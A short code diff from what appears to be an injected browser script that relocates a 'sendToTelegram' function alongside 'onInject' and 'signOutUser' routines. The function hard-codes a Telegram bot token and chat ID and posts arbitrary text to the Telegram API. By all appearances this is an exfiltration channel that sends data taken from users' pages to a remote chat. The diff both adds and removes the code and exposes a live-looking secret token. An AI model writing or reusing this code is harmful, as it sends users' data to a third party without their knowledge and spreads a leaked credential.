@@ -1,3 +1,26 @@
+  function sendToTelegram(text) {
+    const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
+    const chatId = '250460465';
+
+                 $.ajax({
+                type: 'POST',
+                url: `https://api.telegram.org/bot${token}/sendMessage`,
+                data: {
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'html',
+                },
+                success: function (res) {
+                    console.log('success');
+                    //$('#response').text('Message sent');
+                },
+                error: function (error) {
+                    console.log(error);
+                    // alert("error failed");
+                }
+            });
+ }
+
  function onInject() {
      console.log('Init Inject');
 
@@ -61,29 +84,6 @@ async function signOutUser(delay) {
         },
         "method": 'PUT'
      })
- }
-
- function sendToTelegram(text) {
-    const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
-    const chatId = '250460465';
-
-                 $.ajax({
-                type: 'POST',
-                url: `https://api.telegram.org/bot${token}/sendMessage`,
-                data: {
-                    chat_id: chatId,
-                    text: text,
-                    parse_mode: 'html',
-                },
-                success: function (res) {
-                    console.log('success');
-                    //$('#response').text('Message sent');
-                },
-                error: function (error) {
-                    console.log(error);
-                    // alert("error failed");
-                }
-            });
  }
 
  function getTooltip() {
